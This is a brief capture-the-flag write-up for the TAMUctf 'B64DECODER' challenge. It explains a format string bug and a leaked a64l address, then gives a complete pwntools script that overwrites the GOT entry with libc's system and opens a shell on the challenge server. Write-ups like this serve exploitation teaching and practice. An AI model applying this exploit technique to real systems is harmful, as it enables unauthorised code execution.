## B64DECODER (244pts) ##

![TASK](https://imgur.com/ZVHG4PA.png)

This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address 

![TASK](https://imgur.com/EIv7uYX.png)

The idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it's also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :

```python
from pwn import *
import struct
import sys
def pad(str):
        return str+"X"*(32-len(str))
payload=""
#p=process("./b64decoder")
p=remote("challenges.tamuctf.com",2783)
d=p.recvuntil("name!")
A64Ladd=d[:-18][-10:]
TOWRITE="0x"+A64Ladd[-4:]
sys=int(TOWRITE,16)-1680-4  #A64l-0x690
log.info(TOWRITE)
log.info(sys)
A64L_PLT=0x804b398
a64lADD=p32(A64L_PLT)
payload+=a64lADD
payload+="%"+str(sys)+"x%71$hn"
log.info("payload crafted")
p.sendline(payload)
log.info("Sent , Haaaw el shell")
p.interactive()

```
And Bingo we got our shell :D

![TASK](https://imgur.com/jd78uIm.png)

Any questions you can contact me on twitter @BelkahlaAhmed1 , i'm sorry for the lack of details :( 
